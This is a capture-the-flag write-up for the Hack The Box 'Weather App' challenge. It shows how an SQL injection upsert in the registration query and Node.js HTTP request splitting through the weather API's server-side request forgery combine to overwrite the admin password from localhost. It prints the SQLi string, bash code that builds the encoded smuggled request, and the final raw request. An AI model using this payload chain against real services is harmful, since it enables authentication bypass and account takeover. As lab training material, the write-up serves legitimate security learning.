# Weather App

> **A pit of eternal darkness, a mindless journey of abeyance, this feels like**
> **a never-ending dream. I think I'm hallucinating with the memories of my**
> **past life, it's a reflection of how thought I would have turned out if I**
> **had tried enough. A weatherman, I said! Someone my community would look up**
> **to, someone who is to be respected. I guess this is my way of telling you**
> **that I've been waiting for someone to come and save me. This weather**
> **application is notorious for trapping the souls of ambitious weathermen**
> **like me. Please defeat the evil bruxa that's operating this website and set**
> **me free!**

## Becoming a weatherman

### Weather flag

The app reads the flag for us if we manage to login as admin:

```javascript
if (admin) return res.send(fs.readFileSync('/app/flag').toString());
```

### Overwriting the admin

And the admin has a random 32 byte password:

```javascript
INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
```

The select for the login has SQLI hardening while the insert for registering
is plain substitution:

```javascript
let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
```

password=admin') ON CONFLICT(username) DO UPDATE SET password='pass' --+-

### Submitting the request

The whole SQLI overwrite must be triggered by a POST from the localhost:

```javascript
if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
    return res.status(401).end();
}
```

Hopefully there's a node CVE for us: [request splitting][http-request-splitting]
allows to smuggle several requests in a single `http.get` call.

## Weather arcanes

To go through the localhost filter, the goal is to make the server trigger the
request itself with the former SSRF trick.

### Chaining requests

The weather api can submit GET requests:

```javascript
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`);
```

The aim is to smuggle the POST request to `/register` in a GET to `/`.
The whole chain is:

> POST `/api/weather` => GET `/` => POST `/register`

The last POST is smuggled in a GET parameter to `endpoint=127.0.0.1`:

```
endpoint=127.0.0.1&city= HTTP/1.1
Host: 127.0.0.1:80
Connection: keep-alive


POST /register HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
Connection: keep-alive
Content-Length: 95

username=admin&password=admin') ON CONFLICT(username) DO UPDATE SET password='pass'--+-

GET /?&country=register
```

Notice the SQLI to overwrite the admin password.

### Encoding

Still not quite there: the encoding doesn't fit a GET parameter and the
payload is lost.

All CR-LF, spaces, ampersand and quotes must be encoded. Either url encoded,
or UTF-8 encoded, depending on the location in the payload.

#### URL encoding

The SQLI payload, ie the body of the smuggled request, must be url encoded:

```
  => %20
' => %27
```

#### UTF-8 encoding

The rest of the smuggled request must fit in a GET parameter, without being
broken down. The following encoding keeps -courtesy of - everything together:

```bash
spc=$'Ġ'
nwl=$'Ċ'
amp=$'Ħ'
```

All occurences of `${spc}`, `${nwl}` and `${amp}` will be replaced by the corresponding UTF-8
characters in the snippets.

### Divide and conquer

The Request has 4 parts.

#### The parameters

The parameters for the weather api request:

```bash
parameters="endpoint=127.0.0.1:80&city=${spc}"
```

which actually point to the register api.

(after hours of this, everything is starting to get confused...)

#### The actually injection

```bash
upsert="') ON CONFLICT(username) DO UPDATE SET password='pass' --+-"
urle_spaces="${upsert// /%20}"
urle_sqli="${urle_spaces//\'/%27}"
sbody="username=admin${amp}password=admin${urle_sqli}"
sbody_len=$((${#sbody}+2))
```

Notice the length calculation, prepare for the request headers.

#### The headers

```bash
sheaders+="HTTP/1.1${nwl}"
sheaders+="Host:${spc}127.0.0.1:80${nwl}"
sheaders+="Connection:${spc}keep-alive${nwl}${nwl}${nwl}"

sheaders+="POST${spc}/register${spc}HTTP/1.1${nwl}"
sheaders+="Host:${spc}127.0.0.1:80${nwl}"
sheaders+="Content-Type:${spc}application/x-www-form-urlencoded${nwl}"
sheaders+="User-Agent:${spc}Mozilla/5.0${spc}(X11;${spc}Linux${spc}x86_64;${spc}rv:85.0)${spc}Gecko/20100101${spc}Firefox/85.0${nwl}"
sheaders+="Connection:${spc}keep-alive${nwl}"
sheaders+="Content-Length:${spc}${sbody_len}${nwl}${nwl}"
```

#### A test

And another request so that the whole string assembled in the weather module
is coherent:

```bash
test="${nwl}${nwl}GET${spc}/?&country=register"
```

Putting it all together:

```bash
request=${parameters}${sheaders}${sbody}${test}
```

Burp recorded the whole abomination:

```
POST /api/weather HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: curl/7.77.0
Accept: */*
Content-Length: 462
Content-Type: application/x-www-form-urlencoded
Connection: close

endpoint=127.0.0.1:80&city=ĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊConnection:Ġkeep-aliveĊĊĊPOSTĠ/registerĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊContent-Type:Ġapplication/x-www-form-urlencodedĊUser-Agent:ĠMozilla/5.0Ġ(X11;ĠLinuxĠx86_64;Ġrv:85.0)ĠGecko/20100101ĠFirefox/85.0ĊConnection:Ġkeep-aliveĊContent-Length:Ġ110ĊĊusername=adminĦpassword=admin%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27pass%27%20--+-ĊĊGETĠ/?&country=register
```

This has been my biggest struggle on HTB so far!

[http-request-splitting]: https://hackerone.com/reports/409943